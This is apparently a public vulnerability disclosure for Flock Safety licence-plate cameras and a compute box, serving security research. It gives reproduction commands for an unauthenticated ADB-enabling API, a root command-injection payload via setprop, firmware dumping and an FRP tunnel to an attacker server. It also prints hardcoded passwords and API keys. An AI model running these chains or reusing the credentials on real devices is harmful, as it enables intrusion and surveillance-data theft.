CRITICAL `CVE-2025-59404` CVSS 9.8 CWE-1299 Disclosed 9/19/2025 FULL DISCLOSURE ↗

What it is. The Picard/Bravo Compute Box's bootloader was found to be unlocked allowing unauthorized firmware to be installed.

Affected: Picard/Bravo Compute Box

Why it matters. An attacker with physical access can flash modified or malicious firmware onto the device trivially.

How to reproduce it

1. Boot to fastboot (black USB-C, blue light) and read variables; note `unlocked:yes` .

\```
adb reboot bootloader
fastboot getvar all        # note unlocked: yes
\```

##### Evidence (from the unit)

\```
(bootloader) unlocked:yes
\```

#### Finding 24 - Lack of Authentication: EDL/QDL Mode

CRITICAL `CVE-2025-59402` CVSS 9.8 CWE-1299 Disclosed 9/19/2025 FULL DISCLOSURE ↗

## Slide 19

What it is. The Picard/Bravo Compute Box EDL/QDL mode was found to lack any type of authentication or access control.

Affected: Picard/Bravo Compute Box

Why it matters. An attacker with physical access can access device memory, firmware dumping, reading and flashing. In this case it results in a full compromise of the system's integrity.

How to reproduce it

1. Enter EDL (Force USB / EDL cable), connect USB-C.

2. Note the default `prog_firehose_ddr.elf` firehose is accepted unauthenticated (Sahara/Firehose V3.62).

\```
./edl printgpt --memory=ufs --loader=prog_firehose_ddr.elf
\```

#### Finding 25 - Lack of Authentication - Android Debug Bridge

◎ BIRDSHOT CRITICAL CVSS 8.2 CWE-312 Disclosed 9/19/2025 FULL DISCLOSURE ↗

What it is. The Picard/Bravo Compute Box was found to not require authentication (approval) when accessing the device via Android Debug Bridge (ADB).

Affected: Picard/Bravo Compute Box

Why it matters. An attacker with physical access can get 'shell' access to the device.

How to reproduce it

1. Connect USB-C; `adb shell` in - no developer-options requirement, no approval prompt, no pre-shared ADB keys.

\```
adb shell
\```

#### Finding 26 - Improper Access Control - ADB Sideload

CRITICAL CVSS 8.2 CWE-284 Disclosed 9/19/2025 FULL DISCLOSURE ↗

What it is. The Picard/Bravo Compute Box was found to allow sideloading apps via ADB.

Affected: Picard/Bravo Compute Box

Why it matters. An attacker with physical access can install whatever application they want onto the device.

How to reproduce it

1. Sideload an arbitrary APK over unauthenticated `adb` ; note success.

## Slide 20

\```
adb install example.apk
\```

#### Finding 27 - Lack of Flash/UFS Encryption

CRITICAL CVSS 7.8 CWE-312 Disclosed 9/19/2025 FULL DISCLOSURE ↗

What it is. The Picard/Bravo Compute Box was found to lack Flash/UFS encryption. This encryption ensures that if the firmware is dumped from the device, it is unreadable

Affected: Picard/Bravo Compute Box

Why it matters. An attacker with physical access can read or dump the device's firmware in cleartext.

How to reproduce it

1. Dump a UFS partition with `edl` and confirm cleartext via `strings` .

\```
./edl rl dumps/ --memory=ufs --loader=prog_firehose_ddr.elf
strings dumps/userdata.bin | head
\```

### Multi-Device - The App Suite, the Wireless RCE, and the Media Pipeline

Where it stops being about screwdrivers. The Android application suite (Collins, PhoneHomeService, the recording apps) is shared across the LPRs and the Compute Box - and it ships debuggable, with an unauthenticated admin API that turns a shared hotspot password into a wireless shell. Findings 47–49 are the post-whitepaper SpeedPourer / FRP additions.

#### Finding 28 - Unauthenticated Administrative API Endpoints

◎ BIRDSHOT CRITICAL `CVE-2025-59403` CVSS 9.8 CWE-1299 Disclosed 9/27/2025 FULL DISCLOSURE ↗

What it is. The 'Collins' application used to run and manage the LPR image/video stream installed on multiple devices was found to contain a API web service that lacked any form of authentication or authorization.

Affected: Collins Application (com.flocksafety.android.collins) Picard/Bravo Compute Box & Falcon/Sparrow/Flex* LPR

## Slide 21

Why it matters. An attacker with adjacent access can request sensitive information, perform a Denial of Service (DoS), enable wireless command access, enable or disable the camera feed and other sensitive operations In conjunction with other findings in this paper, it results in complete device compromise.

##### How to reproduce it

1. On the same W/LAN, reach the unauthenticated Collins HTTP API and issue administrative requests - no auth token required.

2. The pivot for the wireless RCE chain (Findings 30/33/41) is `PUT /api/v1/system/adb/enable`

   - it turns on ADB-over-TCP (port `5555` ) with no ADB authentication.

The service runs on port `8080` (the WebSocket JPEG feed is on `1040` , MJPEG on `1234` ). None of these require a token:

|Method|Endpoint|What it does|
|---|---|---|
|PUT|`/api/v1/system/adb/enable`|ADB-over-TCPon
`:5555` , no auth - the
RCEpivot|
|PUT|`/api/v1/system/adb/disable`|TurnsADB-over-TCPback off|
|PUT|`/api/v1/liveView/enable` ·
`/disable`|Starts / stops theJPEG&MJPEGlive
feed|
|PUT|`/api/v1/system/reboot`|Reboots the unit -DoS/ reboot loop|
|PUT|`/api/v1/system/switch/enable`|Toggles the camera switch|
|PUT|`/api/v1/system/battery/disable_internal`
·
`/shutdown_delay`|Battery control -DoS|
|PUT|`/api/v1/system/camera/settings`|Writes camera configuration|
|GET|`/api/v1/system/logs`|Full
`logcat` (
`?`
`packageName=&lineCount=` ) - leaks
creds, paths,IDs|
|GET|`/api/v1/system/crashpack` ·
`/getstoredcrashpack` ·|Crash bundles & stored crashpacks|
||`/adb/viewstoredcrashpacks`||
|GET|`/api/v1/system/modem` ·
`/modem/apn`|IMEI,ICCID/IMSI, baseband,APN|
|GET|`/api/v1/system/os`|Build fingerprint & device type (e.g.
`FALCONV21` )|
|GET|`/api/v1/system/apps`|Every installedFlock app and its version|
|GET|`/api/v1/system/battery`|Battery telemetry|
|GET|`/api/v1/system/camera/settings` ·|Camera config, registration &OTAstate|
||`/registration/status` ·
`/ota_status`||

## Slide 22

Finding 29 - Hidden Hardware Debug Functionality - Hotspot

◎ BIRDSHOT CRITICAL CVSS 9.8 CWE-78 Disclosed 9/27/2025 FULL DISCLOSURE ↗

What it is. The Picard/Bravo/Falcon/Flex* LPR and Compute Box were found to contain hidden debug functionality. In this case, by pressing the button on any of the devices 3 times in quick succession, the device's hotspot is enabled. Furthermore, by default all device's weak default hotspot passwords are 'security.' Shoutout to Kajer, who worked out the three-button-press sequence that triggers the hotspot.

Affected: Collins Application (com.flocksafety.android.collins) Picard/Bravo Compute Box & Falcon/Sparrow/Flex* LPR

Why it matters. An attacker with brief physical access can enable the devices to enable their hotspot and then wirelessly connect to them. Chained with other vulnerabilities it greatly increases the risk.

##### How to reproduce it

1. Press the device button 3 times to raise the hidden `Flock-*` debug hotspot (button sequence credited to `kajer` ).

2. Connect using the weak hardcoded hotspot password (identical across units) - this places the attacker on the device LAN for the Collins API / wireless RCE chain.

   - Hotspot password: `security` (uniform across LPR + Compute Box units; also the Raven default-AP password)

#### Finding 30 - Wireless Remote Code Execution (RCE) - System

◎ BIRDSHOT CRITICAL `CVE-2025-59403` CVSS 9.8 CWE-78 Disclosed 9/27/2025 FULL DISCLOSURE ↗

What it is. The Falcon/Sparrow/Flex* LPR and Picard/Bravo Compute Box were found to enable the chaining of multiple vulnerabilities disclosed in this paper together resulting in wireless control of devices with system permissions.

Affected: Collins Application (com.flocksafety.android.collins) Picard/Bravo Compute Box & Falcon/Sparrow/Flex* LPR

Why it matters. An attacker with adjacent access can leverage unauthenticated API requests to enable and then connect to the device wirelessly. Additionally, since the Android applications are installed with debugging enabled, an attacker can leverage that access to execute commands as system.

##### How to reproduce it

1. From the same W/LAN, send the PUT request to enable ADB over TCP without authentication.

## Slide 23

2. Connect wireless `adb` as the `shell` user.

3. Use the debug/JDWP `trigger` on a debuggable privileged app to execute commands as `system` (see Finding 55 JDWP chain).

\```
PUT /api/v1/system/adb/enable
adb connect <device-ip>:5555
adb shell id        # uid=2000(shell) -> escalate via JDWP to uid=1000(system)
\```

#### Finding 31 - Incorrect Default Permissions - Media Recordings Directories

HIGH CVSS 9.8 CWE-922 Disclosed 9/27/2025 FULL DISCLOSURE ↗

What it is. The Falcon/Sparrow/Flex* LPR and Picard/Bravo Compute Box underlying recording app suite was found to store media recording it takes and processes in directories with insecure permissions. In this case, the /storage/emulated/0/flockMedia/media and

/storage/emulated/0/flockMedia/media were found to have overly permissive access control permissions (0774).

Affected: Flock Safety Recording App Suite: com.flocksafety.android.videorecording, com.flocksafety.android.motion, com.flocksafety.android.objects, com.flocksafety.android.encoding, com.flocksafety.android.cameraconfig,

com.flocksafety.android.collins, com.flocksafety.android.streaming Picard/Bravo Compute Box & Falcon/Sparrow/Flex* LPR

Why it matters. An attacker with shell or physical access to a unit can mount or view the adoptable partition and read every stage of the recording lifecycle from 'capturing' to 'encoded' in cleartext.

##### How to reproduce it

1. Obtain `MediaFileUtil` and review the media-

   - partition/ `getExternalStoragePublicDirectory('flockMedia')` logic that creates the world-/group-permissive directories.

2. On hardware, list the media directory and note the `drwxrwxr--` mode.

3. From a secondary process sharing `media_rw` group membership, open any file inside `captured/` or `encoded/` .

\```
adb shell ls -ld /storage/emulated/0/flockMedia/media     # note drwxrwxr-- and media_rw group
adb shell id        # confirm media_rw group membership of the reading process
\```

#### Finding 32 - Shared Media Library Allows Cross-App Data Exposure

HIGH CVSS 8.8 CWE-925 Disclosed 9/27/2025 FULL DISCLOSURE ↗

## Slide 24

What it is. The Flock Safety Recording App Suite (including at least seven Flock Safety Custom APKs) used by the Falcon/Sparrow/Flex** LPRs and Picard/Bravo Compute Box was found to embed the identical MediaFileUtil and MediaSession code, mounting the same adoptable path; a privilege escalation in any non-recording app immediately exposes the entire media library, dramatically expanding the blast radius of otherwise isolated components.

Affected: Flock Safety Recording App Suite: com.flocksafety.android.videorecording, com.flocksafety.android.motion, com.flocksafety.android.objects,

com.flocksafety.android.encoding, com.flocksafety.android.cameraconfig,

com.flocksafety.android.collins, com.flocksafety.android.streaming Picard/Bravo Compute Box & Falcon/Sparrow/Flex* LPR

Why it matters. An attacker who compromises any auxiliary app (installer, live view, streaming) inherits full read/write access to the recording tree because every package bundles the same storage helper bound to /storage/emulated/0/flockMedia/media or

/storage/emulated/0/flockMedia/media.

How to reproduce it

1. Enumerate the co-installed Flock packages and confirm they share the system UID.

2. Decompile `flock-collins.apk` / `flock-video-streaming.apk` and inspect `MediaFileUtil` ; note it resolves the shared external media tree, so any suite app reads another's captures.

\```
adb shell dumpsys package com.flocksafety.android.* | grep versionName
adb shell ls -R /storage/emulated/0/flockMedia/media | head
\```

#### Finding 33 - Wireless Remote Code Execution (RCE) - Shell

◎ BIRDSHOT CRITICAL `CVE-2025-59403` CVSS 8.8 CWE-78 Disclosed 9/27/2025 FULL DISCLOSURE ↗

What it is. The Falcon/Sparrow/Flex* LPR and Picard/Bravo Compute Box were found to enable the chaining of multiple vulnerabilities disclosed in this paper together resulting in wireless control of devices.

Affected: Collins Application (com.flocksafety.android.collins) Picard/Bravo Compute Box & Falcon/Sparrow/Flex* LPR

Why it matters. An attacker with adjacent access can leverage unauthenticated API request to enable and then connect to the device wirelessly.

##### How to reproduce it

1. Send the PUT request to enable ADB over TCP without authentication.

2. Connect wireless `adb` and obtain a `shell` -user context on the device.

## Slide 25

\```
PUT /api/v1/system/adb/enable
adb connect <device-ip>:5555 && adb shell
\```

#### Finding 34 - Unauthenticated Debug Broadcast Clears Settings and Shuts Off Device

HIGH CVSS 8.2 CWE-925 Disclosed 9/27/2025 FULL DISCLOSURE ↗

What it is. The PhoneHomeService Application registers a system-wide debug broadcast with no permission gate; sending type=update with metadata.type=clear drives

clearSettingsAndPowerOff, wiping camera settings and issuing a privileged shutdown.

Affected: Phone Home Service Application( com.flocksafety.android.phonehomeservice) Picard/Bravo Compute Box & Falcon/Sparrow/Flex* LPR

Why it matters. An attacker with physical, local access or a malicious installed application can issue a broadcast that will wipe and shut off the device.

How to reproduce it

1. After connecting to the device, send the unauthenticated debug broadcast (note the literal misspelling `flocksaftey` in the action string).

2. The receiver clears settings and powers the device off.

\```
adb shell am broadcast -a com.flocksaftey.action.DEBUG_ONE_SHOT --es type update --es metadata
'{"type":"clear"}'
\```

#### Finding 35 - Multiple Privileged System Apps Shipped with Debugging Enabled

HIGH CVSS 7.9 CWE-925 Disclosed 9/27/2025 FULL DISCLOSURE ↗

What it is. The Falcon/Sparrow/Flex* LPR and Picard/Bravo Compute Box were found to be deployed with a custom Android application suite all of which had debugging enabled.

Affected: Multiple Applications Picard/Bravo Compute Box & Falcon/Sparrow/Flex* LPR

Why it matters. An attacker with shell access can tamper with the application during runtime. Additionally, this issue was leveraged in other findings.

How to reproduce it

1. Confirm a target app is debuggable via `dumpsys` .

2. Mark it as the persistent debug app and attach a JDWP debugger to tamper in a privileged (system) context.

## Slide 26

\```
adb shell dumpsys package com.flocksafety.android.phonehomeservice | grep -i debuggable
adb shell am set-debug-app --persistent com.flocksafety.android.phonehomeservice
\```

#### Finding 36 - Lack of Per-File Encryption on Sensitive Media

HIGH CVSS 7.9 CWE-925 Disclosed 9/27/2025 FULL DISCLOSURE ↗

What it is. The Flock Safety Recording App Suite used by the Falcon/Sparrow/Flex** LPRs and Picard/Bravo Compute Box were found to utilize services with insecure run time data policies. Specifically the Capture, motion, ML, and encoding services persist all intermediates and finals directly onto the adoptable /storage/emulated/0/flockMedia/media tree without any per file encryption; once the media-ready property (getprop) completes and the LUKS volume is mounted, every JPEG/YUV/MP4 remains readable, exposing raw evidence to anyone who can access the partition.

Affected: Flock Safety Recording App Suite: com.flocksafety.android.videorecording, com.flocksafety.android.motion, com.flocksafety.android.objects,

com.flocksafety.android.encoding, com.flocksafety.android.cameraconfig,

com.flocksafety.android.collins, com.flocksafety.android.streaming Picard/Bravo Compute Box & Falcon/Sparrow/Flex* LPR

Why it matters. An attacker with shell or physical access to an unit can mount the adoptable partition and read every stage from 'capturing' to 'encoded' in cleartext.

How to reproduce it

1. Access an affected device and wait for the media-ready property to return `true` ( `getprop` `<media-ready prop>` ).

2. List the media tree and note the plain JPEG/YUV/MP4 files.

3. Pull any file and open it locally - it decrypts with no keys or decrypt step.

\```
adb shell getprop <media-ready-prop>        # returns true when media staged
adb shell ls -R /storage/emulated/0/flockMedia/media
adb pull /storage/emulated/0/flockMedia/media/<session>/<file>.mp4
\```

#### Finding 37 - Sensitive Information Disclosed - Hardcoded Auth0 Secret

HIGH `CVE-2025-59406` CVSS 6.6 CWE-319 Disclosed 9/27/2025 FULL DISCLOSURE ↗

What it is. The Falcon/Sparrow & Picard/Bravo Compute Box were found to use custom Android apps across devices. In this case, the 'Pisco' application installed on multiple devices was found to hardcode a static Auth0 client secret as well as store the Auth0 token and JWT in cleartext.

## Slide 27

Affected: Pisco ( com.flocksafety.android.pisco ) Android Application Picard/Bravo Compute Box & Falcon/Falcon/Flex* LPR

Why it matters. An attacker with local access can dump the APKs and extract the hardcoded sensitive information from their APKs.

How to reproduce it

1. Decompile the Pisco APK and search for the `auth0_client_secret` string constant.

2. Note the static Auth0 client secret is embedded in cleartext (the original whitepaper left this finding's reproduction body blank).

\```
apktool d Pisco-v6.21.11.apk -o pisco_out
grep -R 'auth0_client_secret' pisco_out/
\```

`auth0_client_secret` : [withheld]

Note: The severity of this finding has been significantly reduced as per the scope, testing the validity of the Auth0_client, secret, JWT and token was not performed.

#### Finding 38 - Root Command Injection via Data Log Cleanup Service

CRITICAL CVSS 5.4 CWE-78 Disclosed 9/27/2025 FULL DISCLOSURE ↗

What it is. The 'SystemControlService service was found to be vulnerable to command injection that is executed with root privileges. In this case, one or more properties are used within the execution of the clean_data_partition.rc and its bash script without input validation. It can also be triggered manually by modifying flock.clean_data_partition value.

Affected: DataLog Cleanup Service (flock.clean_data_partition.sh) Picard/Bravo Compute Box & Falcon/Falcon/Flex* LPR

Why it matters. An attacker with system level permissions can insert a specifically crafted payload within a specific property that results in root command execution. This results in full device compromise. Additionally an attacker with control of another application within the 'Flock' SELinux context can also trigger this vulnerability.

How to reproduce it

1. The root script reads a device property with `getprop` and uses it unsanitized in a bash test/ `find` , executing as UID 0 ( `init` ).

2. Set the retention/size property to a command-injection payload via the system-commandinjection primitive from prior findings.

3. Trigger the cleanup service (set `flock.clean_data_partition` to 1) and note the payload runs as root.

4. Vulnerable script lines: `logs_max_size_in_mb=` getprop persist.vendor.flock.data.logs.max_size_mb `` and` find /data/anr -type f -mtime

+$logs_retention_in_days -delete`.

## Slide 28

5. NOTE: SELinux policy blocks execution by default on the analyzed unit; production policy state is unconfirmed.

\```
adb shell 'setprop persist.vendor.flock.data.logs.max_size_mb "1 ]]; /system/bin/id >
/data/local/tmp/flock_root #"'
adb shell 'setprop flock.clean_data_partition 1'
adb shell cat /data/local/tmp/flock_root     # uid=0(root) gid=0(root) => root code exec
\```

Note: By default, the Selinux Policy prevents the root commands from being executed, therefore reducing the severity significantly. However, the underlying vulnerability is still there. It is unclear if any of the paths to root, such as the data log cleanup service is used in units currently deployed in the wild.

#### Finding 39 - Excessive Sensitive Media Copies Persist on Disk

MEDIUM CVSS 5.4 CWE-925 Disclosed 9/27/2025 FULL DISCLOSURE ↗

What it is. The Flock Safety Recording App Suite used by the Falcon/Sparrow/Flex** LPRs and Picard/Bravo Compute Box was found to serialize every session through up to seven directory hops ( `capturing/` , `captured/` , `motionProcessed/` , `detectionProcessed/` , `encodedStaging/` , `encoded/` , `discarded/` , plus `crashpack/` spillover), creating numerous long-lived copies of the same evidence; absent prompt deletion, the expanded footprint makes local exfiltration trivial even if one directory is cleaned.

Affected: Flock Safety Recording App Suite: com.flocksafety.android.videorecording, com.flocksafety.android.motion, com.flocksafety.android.objects, com.flocksafety.android.encoding, com.flocksafety.android.cameraconfig, com.flocksafety.android.collins, com.flocksafety.android.streaming Picard/Bravo Compute Box & Falcon/Sparrow/Flex* LPR

Why it matters. An attacker with access to the adoptable partition can harvest multiple redundant copies (raw frames, motion-filtered sets, ML outputs, staging encodes, crashpacks) that persist until manual purge, greatly increasing the available data set for exfiltration.

How to reproduce it

1. List the media tree for a single capture session and note the same session identifier persists across every stage directory (intermediate copies are not collapsed).

2. `deleteSessionFilesFromAllDirs()` does not reliably clear all paths, so plaintext copies accumulate.

\```
adb shell ls -R /storage/emulated/0/flockMedia/media | grep <session-id>
\```

## Slide 29

Finding 40 - Sensitive Information Disclosed - Cleartext API Keys/Credentials

Disclosed

9/27/2025 FULL DISCLOSURE ↗

\```
CVE-2025-47823
\```

CVSS

6.6 CWE-798

MEDIUM

What it is. The Falcon/Sparrow/Flex* LPR and Picard/Bravo Compute Box were found to use custom Android apps across devices. In this case, there are multiple instances of hardcoded and clear text sensitive information, including but not limited to API keys and credentials.

Affected: Multiple Applications Picard/Bravo Compute Box & Falcon/Falcon/Flex* LPR & Raven Gunshot Detection System

Why it matters. An attacker with local access can dump the APKs and extract the hardcoded sensitive information from their APKs.

How to reproduce it

1. Decompile the app suite and inspect the three classes; note the cleartext key/password constants.

2. Supporting constants confirm the context: `CoreValues("cereal", DEFAULT_API_KEY, "https://dev-gimlet.flocksafety.com/", ...)` , `SETTINGS_URI =`

   - `content://com.flocksafety.android.settingsservice.provider/settings` ,

   - `DEFAULT_KEYSTORE_TYPE="JKS"` , `DEFAULT_PROTOCOL="SSL"` ,

   - `DEFAULT_SECURE_RANDOM_ALGORITHM="SHA1PRNG"` .

   - `getHpnotiqApiKey()` return: `HaJ3FgupAm8RrDJW3MHgT9X7Ft27eVaD`

   - `CoreValues.DEFAULT_API_KEY` : `dirtymartini`

   - `SSL.DEFAULT_KEYSTORE_PASSWORD` : `changeit` (the well-known Java default keystore

   - password)

Note: This finding was improperly included in CVE-2025-47823 instead of being given its own CVE # when the Vendor submitted the CVE assignment request.

#### Finding 41 - Wireless Remote Code Execution (RCE) - Root

CRITICAL CVSS 5.4 CWE-78 Disclosed 9/27/2025 FULL DISCLOSURE ↗

What it is. The Falcon/Sparrow/Flex* LPR and Picard/Bravo Compute Box were found to enable the chaining of multiple vulnerabilities disclosed in this paper together resulting in wireless control of devices with root permissions.

Affected: Collins Application (com.flocksafety.android.collins) DataLog Cleanup Service Picard/Bravo Compute Box & Falcon/Falcon/Flex* LPR

Why it matters. An attacker with adjacent access can leverage unauthenticated API requests to enable and then connect to the device wirelessly. Additionally, since the Android applications are installed with debugging enabled, an attacker can leverage that access to execute commands as root.

## Slide 30

How to reproduce it

1. Enable ADB over TCP via the unauthenticated PUT request; connect wireless `adb` as `shell` .

2. Set the `persist.vendor.flock.data.logs.*` property to a root command-injection payload and trigger `flock.clean_data_partition=1` (Finding 38) to execute as root over Wi-Fi.

\```
PUT /api/v1/system/adb/enable
adb connect <device-ip>:5555
adb shell 'setprop persist.vendor.flock.data.logs.max_size_mb "1 ]]; /system/bin/id >
/data/local/tmp/flock_root #"; setprop flock.clean_data_partition 1'
\```

Note: By default, the Selinux Policy prevents the root commands from being executed, therefore reducing the severity significantly. However, the underlying vulnerability is still there. It is unclear if any of the paths to root, such as the data log cleanup service is used in units currently deployed in the wild.

#### Finding 42 - ML/AI Local Model Accessible

What it is. The Falcon/Sparrow/Flex* LPR and Picard/Bravo Compute Box store their AI/ML local inference modules in cleartext, leaving the models fully exposed. Original discloser unknown - credit to whoever surfaced this first.

Affected: DetectionProcessing (com.flocksafety.android.objects) Android Application Picard/Bravo Compute Box & Falcon/Falcon/Flex* LPR

Why it matters. Plaintext AI/ML binaries let any local or remote foothold copy, reverse, or tamper with inference logic, enabling model plagiarism, rapid bypass of decision thresholds, targeted poisoning of detections, and seamless chaining into the already-documented vulnerabilities.

How to reproduce it

1. List the adoptable media tree / app assets to confirm cleartext ML payloads.

2. Pull or extract the NativeML artifacts ( `*.tflite` , `models.json` , `label_map*.json` ).

\```
adb shell ls -R /storage/emulated/0/flockMedia | grep -Ei 'tflite|models.json|label_map'
adb pull <path>/model.tflite ./loot/
\```

Note: I'm only aware that the Vendor has been told that the models are accessible. I am unsure who originally discovered them and disclosed them to the Vendor.

Finding 43 - Sensitive Information Disclosed - Hardcoded Java Keystore & Password

HIGH `CVE-2025-59407` CVSS 3.2 CWE-1299 Disclosed 9/27/2025 FULL DISCLOSURE ↗

## Slide 31

What it is. The Falcon/Sparrow & Picard/Bravo Compute Box were found to use custom Android apps across devices. In this case, the 'Flock DetectionProcessing application was found to contain a cleartext password for a Java Keystore. This keystore contains the mutual TLS (mTLS) certificate the device uses when communicating with the cloud infrastructure.

Affected: DetectionProcessing (com.flocksafety.android.objects) Android Application Picard/Bravo Compute Box & Falcon/Falcon/Flex* LPR

Why it matters. An attacker with local access can dump the APKs and extract the hardcoded sensitive information from their APKs.

How to reproduce it

1. Locate the keystore and the hardcoded password in `ConnectionClient` .

2. Use Bouncycastle to extract `cert.pem` with the hardcoded password; use `openssl` to extract the private key; verify with `keytool` .

Keystore password: `flockhibiki17` (keystore `flock_rye.bks` )

Note: The severity of this finding has been significantly reduced as per the scope, testing of the validity of this mTLS certificate was not performed.

#### Finding 44 - Data Recording Retention Relies Solely on Disk Capacity

MEDIUM CVSS 0.0 N/A Disclosed 9/27/2025 FULL DISCLOSURE ↗

What it is. The only default automatic deletion policy prunes oldest files when disk usage exceeds TARGET_DISK_PERCENTAGE (85% by default); there is no age-based purge, so irrelevant footage persists indefinitely until storage is almost full.

Affected: Falcon/Sparrow/Flex* LPR & 'Picard/Bravo' Compute Box

Why it matters. An attacker with physical access can view, tamper or steal the recordings and AI output from the word-readable partition that lacks app-level encryption.

##### How to reproduce it

1. Observe that pruning only occurs when disk usage crosses `TARGET_DISK_PERCENTAGE` (85%) - there is no time/event-based retention.

2. Watch the cleanup log while filling the media volume.

\```
adb logcat -s MediaManagement | grep "Deleting file"
\```

Note: It is unclear if the devices that are deployed in the wild have different data storage policies.

## Slide 32

#### Finding 45 - Records Are Stored on an Unencrypted External Partition

HIGH CVSS 0.0 N/A Disclosed 9/27/2025 FULL DISCLOSURE ↗

What it is. The Falcon/Sparrow & Picard/Bravo Compute Box were found to capture sessions write raw media into the '/storage/emulated/0/flockMedia/...' directory via

Environment.getExternalStoragePublicDirectory when configured.

Affected: Picard/Bravo Compute Box & Falcon/Falcon/Flex* LPR

Why it matters. An attacker with physical access can view, tamper or steal the recordings and AI output from the word-readable partition that lacks app-level encryption

How to reproduce it

1. Confirm a media file exists under the external `flockMedia/media` tree and pull it - it opens without credentials, proving the records are stored unencrypted on external storage.

\```
adb shell ls -R /storage/emulated/0/flockMedia/media
adb pull /storage/emulated/0/flockMedia/media/<capture>/clip.mp4
\```

Note: The severity of this finding has been reduced significantly as it is unclear if units deployed in the wild are configured with this policy.

#### Finding 46 - Sensitive Information Disclosed - Datadog API Token

LOW `CVE-2025-59405` CVSS 0.0 CWE-312 Disclosed 9/27/2025 FULL DISCLOSURE ↗

What it is. The 'Peripheral application installed on multiple devices was found to hardcode a static Datadog API token.

Affected: Peripheral (com.flocksafety.android.peripheral)application Falcon/Sparrow/Flex* LPR & 'Picard/Bravo' Compute Box

Why it matters. An attacker with physical or local access can issue a broadcast that will wipe and shut off the device. Additionally, another application on the device may be able to as well.

How to reproduce it

1. Decompile the app and read the Datadog token constant from `BuildConfig.java` .

2. Per whitepaper limitations, this token was later observed no longer valid (tracked as excepted).

Datadog API token: [withheld - noted as no longer valid]

Finding 47 - Cleartext Media and Control Transmission

LOW Disclosed 2/11/2026 FULL DISCLOSURE ↗

## Slide 33

##### How to reproduce it

1. Extract the manifest and confirm global cleartext is enabled; pull the SpeedPourer `ipconfig.txt` LAN fallback profile.

2. With the FRP tunnel disabled/degraded, capture RTSP media and control traffic on the shared deployment subnet - it traverses without TLS.

\```
adb pull /data/.../assets/ipconfig.txt        # static LAN fallback profile
# Wireshark: capture RTSP on the deployment LAN with FRP down
\```

#### Finding 48 - FRP Tunnel Configuration Permission Weakness

LOW Disclosed 2/11/2026 FULL DISCLOSURE ↗

##### How to reproduce it

1. As a `system` -context actor (reachable because the app ships debuggable), enumerate the SpeedPourer files dir and confirm `frpc.ini` ownership/permissions.

2. Overwrite `frpc.ini` to inject arbitrary tunnels / disable encryption / exfiltrate FRP secrets, then restart the service to load it.

\```
adb shell su -c 'ls -l /data/user/0/com.flocksafety.android.speedpourer/files/frpc.ini'
\```

#### Finding 49 - Embedded FRP Reverse Proxy Access Control

LOW Disclosed 2/11/2026 FULL DISCLOSURE ↗

##### How to reproduce it

1. Point the embedded FRP client at an attacker-controlled FRP server (lab), exposing the local admin/ONVIF portal over the tunnel and bypassing on-prem controls.

2. Reload the FRP config via the SpeedPourer service, then reach the proxied admin portal.

3. NOTE: public server addresses are intentionally left as `<YOUR-VPS-IP>` placeholders - do not target third-party infrastructure.

## Slide 34

\```
# attacker VPS /etc/frp/frps.ini  (lab example)
[common]
bind_port = 7000
token = testtoken
# device /data/.../speedpourer/files/frpc.ini  (lab example)
[common]
server_addr = <YOUR-VPS-IP>
server_port = 7000
token = testtoken
[web-tcp]
type = tcp
local_ip = 127.0.0.1
local_port = 8000
remote_port = 18080
adb shell su -c 'am startservice -n com.flocksafety.android.speedpourer/.SpeedPourerService'
\```

### Public & Standalone Applications

The apps anyone can pull from the store or the field toolkit: cleartext traffic, keys baked into resources, tokens in logs, and an installer app that ships operational artifacts. Finding 54 is the FS Installer bucket added post-whitepaper.

#### Finding 50 - Cleartext Communications

MEDIUM CVSS 6.9 CWE-319 FULL DISCLOSURE ↗

What it is. The FSInstaller Android application was found to allow cleartext communications. In this case the application's manifest contained 'android:usersCleartextTraffic="true" as well as hardcoded references to: 'http://192.168.43.1:8080/ and http://%s:8081/LAPI/V1.0/.'

Affected: FSInstaller Application (com.flocksafety.hazyhiwire)

Why it matters. Using cleartext communications makes it trivial for an attacker to intercept the application's traffic.

How to reproduce it

1. Decompile the APK; confirm `usesCleartextTraffic="true"` in the manifest and locate hardcoded `http://` endpoints via `strings` .

\```
apktool d app.apk -o out && grep -R 'usesCleartextTraffic' out/AndroidManifest.xml
strings out/ -a | grep -Eo 'http://[^ "]+' | sort -u
\```

##### Evidence (from the unit)

\```
android:usesCleartextTraffic="true"
\```

## Slide 35

Finding 51 - Google API Key Disclosure

INFORMATIONAL CVSS 0.0 CWE-319 FULL DISCLOSURE ↗

What it is. The Flock Safety Android application was found to contain a hardcoded Google API key.

Affected: Flock Safety (com.flocksafety.sweetwater)

Why it matters. An attacker can download the application, extract the API keys and use them to access their backend APIs if they are valid.

How to reproduce it

1. Decompile and read the `AIza` -prefixed Google API key string from `strings.xml` .

\```
grep -R 'AIza' out/res/values/strings.xml
\```

Google API key: `AIza[REDACTED:google-api-key]`

#### Finding 52 - Plaintext HTTP in Logs

LOW CVSS 0.0 CWE-319 FULL DISCLOSURE ↗

What it is. The FlockOnPatrol Android application was found to leak plaintext HTTP requests and responses into logcat logs.

Affected: FlockOnPatrol ( com.flocksafety.android.negroni)

Why it matters. An attacker can download the application, extract the API keys and use them to access their backend APIs if they are valid.

How to reproduce it

1. Install the production APK, authenticate, and trigger the `Run Plate` workflow.

2. Observe full request headers/bodies - including `Authorization` bearer tokens and plate intelligence - logged to logcat.

\```
adb logcat -s OkHttp
\```

Note: This application is likely past its End of Life (EOL)

#### Finding 53 - API Keys Disclosure

CVSS 0.0 CWE-319 FULL DISCLOSURE ↗

INFORMATIONAL

## Slide 36

What it is. The FlockOnPatrol Android application was found to contain multiple hardcoded API keys.

Affected: FlockOnPatrol (com.flocksafety.android.negroni)

Why it matters. An attacker can download the application, extract the API keys and use them to access their backend APIs if they are valid.

How to reproduce it

1. Decompile the app and extract the hardcoded third-party keys/tokens from the JS bundle / resources / `BuildConfig` .

\```
apktool d 'Field App_2.1.0_APKPure.apk' -o field_out
grep -Eo '(apiKey|analyticsKey|bugSnagKey|RNUxCamKey|MIXPANEL_TOKEN|bugsnag_key)["= :]+[^,"]+'
field_out/assets/index.android.bundle
\```

   - `apiKey DovzN73QUSfwtSW7idf7` , `analyticsKey 2q0ognS3MXqrc1DrkdSn701Y3bFQBkLB` , `bugSnagKey d86c32ff4f5b29c3953e7bab0c41da3f` , `RNUxCamKey xhsan43d8gqg1m6 MIXPANEL_TOKEN b9c5c44cb07d5fb223d1d861c7a1513b` , `bugsnag_key bb51512a210b12342408a42d83bac633`

- Note: This application is likely past its End of Life (EOL)

#### Finding 54 - Sensitive Operational Artifact Disclosure (FS Installer)

